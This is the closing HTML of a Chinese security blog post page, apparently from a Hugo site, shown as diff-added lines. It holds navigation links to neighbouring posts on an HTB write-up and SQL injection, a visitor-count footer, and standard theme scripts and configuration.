+  </div><div class="post-nav"><a href="/posts/hackthebox-valentine/" class="post-nav-item" rel="prev" title="HTB靶机 012 Valentine WriteUp"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>HTB靶机 012 Valentine WriteUp</a><a href="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/" class="post-nav-item" rel="next" title="019-SQL注入之OrderBy位置点注入">019-SQL注入之OrderBy位置点注入<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
